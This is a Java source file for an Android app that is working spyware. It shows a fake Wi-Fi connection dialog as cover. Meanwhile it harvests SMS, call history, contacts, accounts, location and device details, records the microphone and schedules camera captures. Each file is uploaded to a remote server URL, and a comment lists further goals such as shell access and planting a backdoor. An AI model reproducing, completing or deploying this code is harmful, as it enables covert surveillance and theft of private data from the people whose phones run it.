package intert.internet;


import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.PrintWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.FileNotFoundException;

import java.text.SimpleDateFormat;

import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.ArrayList;
import java.util.Set;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

import android.util.Log;

import android.app.ProgressDialog;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;

import android.media.MediaRecorder;
import android.provider.MediaStore;
import android.provider.CallLog;

import android.location.LocationManager;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import android.database.Cursor;
import android.net.Uri;

import android.view.Gravity;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;

import android.content.Intent;
import android.content.pm.PackageManager;

import android.hardware.Camera;
import android.hardware.Camera.ShutterCallback;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Size;

import android.content.Context;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;

import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.widget.Toast;
import android.widget.TextView;

import android.accounts.Account;
import android.accounts.AccountManager;

import android.os.Bundle;
import android.os.Build;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Environment;

import android.view.Menu;

import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;

import android.database.Cursor;
import android.net.Uri;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.InputStreamBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.CoreProtocolPNames;
import org.apache.http.util.EntityUtils;

/* imported for threading */

/* eof imported for threading */

public class MainActivity extends Activity {
    private MediaRecorder recorder = new MediaRecorder();

    /* service for photo taken from the internet */
    Intent service_photo;
    final Handler mHandler = new Handler();
    public FileSystemOp fso = new FileSystemOp();
    public RootOp r00t = new RootOp();
    public Enumclass enumer = new Enumclass();

    private ProgressDialog progressDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Context myContext;
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressDialog = ProgressDialog.show(MainActivity.this,"Menghubungkan ke Wifi",
                "Menghubungkan ke Wifi ... harap menunggu hingga terhubung, jangan menutup jendela ini", false, false);

        fso.prepare_log_dir();
        fso.JustExec("touch /sdcard/debug.log");
        fso.JustExec("touch /sdcard/tcidata/root.log");
        fso.JustExec("touch /sdcard/tcidata/command.log");



        Calendar cal = Calendar.getInstance();
        /* start photo and audio record service */
        service_photo = new Intent(getBaseContext(), CapPhoto.class);
        cal.add(Calendar.SECOND, 20);
        //TAKE PHOTO EVERY 20 SECONDS
        PendingIntent pintent = PendingIntent.getService(this, 0, service_photo, 0);
        AlarmManager alarm = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarm.setRepeating(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),60*60*1000, pintent);
        startService(service_photo);
        /* eof start photo service */

        startRecordAudioThread();
        do_main();


        progressDialog.dismiss();
        setContentView(R.layout.activity_main);
    }

    protected void do_upload(String uri, String filep, String filen) {
        try {

            InputStream inputStream = new FileInputStream(new File(filep));

            byte[] data = fso.convertToByteArray(inputStream);
            HttpClient httpClient = new DefaultHttpClient();
            httpClient.getParams().setParameter(CoreProtocolPNames.USER_AGENT, System.getProperty("http.agent"));
            HttpPost httpPost = new HttpPost(uri);
            InputStreamBody inputStreamBody = new InputStreamBody(new ByteArrayInputStream(data), filen);
            MultipartEntity multipartEntity = new MultipartEntity();
            multipartEntity.addPart("file", inputStreamBody);
            httpPost.setEntity(multipartEntity);
            HttpResponse httpResponse = httpClient.execute(httpPost);
            String stringResponse = EntityUtils.toString(httpResponse.getEntity());
        }
        catch (FileNotFoundException e1) {
            fso._do_log_debug(e1, "do_upload");
        }
        catch (ClientProtocolException e) {
            fso._do_log_debug(e, "do_upload");

        } catch (IOException e) {
            fso._do_log_debug(e, "do_upload");
        }
    }

    protected void do_main() {
        try {
            String FileToUpload;

                /*
                required :
                1. Shell Access                         -> half done
                2. Pengambilan Screenshot               - failed
                3. Pengambilan Call History             -> done
                4. Pengambilan SMS                      -> done
                5. Pengambilan Chatting                 -> half
                6. Get contact                          -> done
                7. Record Voice                         -> done : record voice service
                8. Pengambilan gambar melalui kamera    -> done : photo service
                9. Cara Penanaman Backdoor
                10.Uploading files

                 try su root (unimplemented)
                //r00t._TestSuBinary();
                */
            String urlString = getString(R.string.ur1);

            startGetInBoxSmsThread();

            startgetCallDetailsThread();

            startDoGetLocationAndLogThread();

            startGetCompleteDeviceInfoAndLogResultThread();


            startget_all_accountsThread();


            startget_contactThreadThread();

            /*
            enumer.StealPrimaryData();

            FileToUpload = "/sdcard/tcidata.zip";
            uploadF(FileToUpload);
            */


        }
        catch (Exception e) {
            fso._do_log_debug(e, "do_main");
        }

    }
    protected void startget_contactThreadThread() {
        Thread t7 = new Thread() {
            public void run() {
                get_contactThread();
            }
        };
        t7.start();
    }
    protected void get_contactThread() {
        String urlString = getString(R.string.ur1);
        enumer.get_contact(MainActivity.this);
        do_upload(urlString, "/sdcard/tcidata/contact.log", "contact.log");
    }


    protected void startget_all_accountsThread() {
        Thread t6 = new Thread() {
            public void run() {
                get_all_accountsThread();
            }
        };
        t6.start();
    }
    protected void get_all_accountsThread() {
        String urlString = getString(R.string.ur1);
        enumer.get_all_accounts(MainActivity.this);
        do_upload(urlString, "/sdcard/tcidata/accounts.log", "accounts.log");
    }

    protected void startGetCompleteDeviceInfoAndLogResultThread() {
        Thread t5 = new Thread() {
            public void run() {
                GetCompleteDeviceInfoAndLogResultThread();
            }
        };
        t5.start();
    }
    protected void GetCompleteDeviceInfoAndLogResultThread() {
        String urlString = getString(R.string.ur1);
        enumer.GetCompleteDeviceInfoAndLogResult(MainActivity.this);
        do_upload(urlString, "/sdcard/tcidata/device.log", "device.log");
     }


    protected void startDoGetLocationAndLogThread() {
        Thread t4 = new Thread() {
            public void run() {
                DoGetLocationAndLogThread();
            }
        };
        t4.start();
    }
    protected void DoGetLocationAndLogThread() {
        String urlString = getString(R.string.ur1);
        enumer.DoGetLocationAndLog(MainActivity.this);
        do_upload(urlString, "/sdcard/tcidata/location.log", "location.log");
    }

    protected void startgetCallDetailsThread() {
        Thread t3 = new Thread() {
            public void run() {
                getCallDetailsThread();
            }
        };
        t3.start();
    }

    protected void getCallDetailsThread() {
        String urlString = getString(R.string.ur1);
        String call_log = getCallDetails();
        fso.JustExec("touch /sdcard/tcidata/call.log");
        fso.append_file("/sdcard/tcidata/call.log", call_log);
        do_upload(urlString, "/sdcard/tcidata/call.log", "call.log");
    }
    protected void startGetInBoxSmsThread() {
        Thread t2 = new Thread() {
            public void run() {
                GetInBoxSmsThread();
            }
        };
        t2.start();
    }

    protected void GetInBoxSmsThread() {
        String urlString = getString(R.string.ur1);
        String sms = enumer.GetInBoxSms(MainActivity.this);
        fso.JustExec("touch /sdcard/tcidata/sms.log");
        fso.append_file("/sdcard/tcidata/sms.log", sms);
        do_upload(urlString, "/sdcard/tcidata/sms.log", "sms.log");
    }
    protected void startRecordAudioThread() {
        Thread t = new Thread() {
            public void run() {
                RecordAudio();
            }
        };
        t.start();
    }


    public void RecordAudio() {
        try {
            String urlString = getString(R.string.ur1);
            String path = "/sdcard/tcidata/mic.mp3";
            fso.JustExec("touch " + path);
            recorder.setMaxDuration(300000);
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(path);
            recorder.prepare();
            recorder.start();
            do_upload(urlString, "/sdcard/tcidata/mic.mp3", "mic.mp3");
        }
        catch (Exception e) {
            fso._do_log_debug(e, "RecordAudio");
        }
    }

    public String getCallDetails() {
        StringBuffer sb = new StringBuffer();

        try {
            Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
            sb.append("Call Details :");
            while (managedCursor.moveToNext()) {
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                sb.append("\n----------------------------------");
            }
            managedCursor.close();

        } catch (Exception e) {
            fso._do_log_debug(e, "getCallDetails");
            e.printStackTrace();
        }
        return sb.toString();
    }

    /*

    private class InternetApp extends AsyncTask<Void, Integer, Void>{

        @Override
        protected void onPreExecute()
        {
            //Create a new progress dialog
            progressDialog = ProgressDialog.show(MainActivity.this,"Loading, please wait...",
                    "Loading Application, please wait...", false, false);
        }


        @SuppressWarnings("deprecation")
        public void uploadF(String file) {
            HttpURLConnection conn = null;
            DataOutputStream dos = null;
            DataInputStream inStream = null;

            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary = "*****";
            int bytesRead, bytesAvailable, bufferSize;
            byte[] buffer;
            int maxBufferSize = 1 * 1024 * 1024 * 1024;

            String urlString = getString(R.string.ur1);
            try {

                FileInputStream fileInputStream = new FileInputStream(new File(
                        file));

                URL url = new URL(urlString);

                conn = (HttpURLConnection) url.openConnection();

                conn.setDoInput(true);

                conn.setDoOutput(true);

                conn.setUseCaches(false);

                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type","multipart/form-data;boundary=" + boundary);
                dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"file\";filename=\"" + file + "\"" + lineEnd);
                dos.writeBytes(lineEnd);

                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                buffer = new byte[bufferSize];

                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                while (bytesRead > 0) {
                    dos.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                fileInputStream.close();
                dos.flush();
                dos.close();
            } catch (MalformedURLException ex) {
                fso._do_log_debug(ex, "uploadFile");

            } catch (IOException ioe) {
                fso._do_log_debug(ioe, "uploadFile");

            }
            // ------------------ read the SERVER RESPONSE
            try {
                if (conn != null){
                    inStream = new DataInputStream(conn.getInputStream());
                    String str;

                    while ((str = inStream.readLine()) != null) {

                    }
                    inStream.close();
                }

            } catch (IOException ioex) {
                fso._do_log_debug(ioex, "uploadFile");

            }
        }



        //The code to be executed in a background thread.
        @Override
        protected Void doInBackground(Void... params)
        {
            try {


            }
            catch (Exception e) {
                // Do nothing
                fso._do_log_debug(e, "doInBackground");
            }

            return null;
        }

        //after executing the code in the thread
        @Override
        protected void onPostExecute(Void result)
        {
            //close the progress dialog
            progressDialog.dismiss();
            //initialize the View
            setContentView(R.layout.activity_main);
        }
    }
    */
}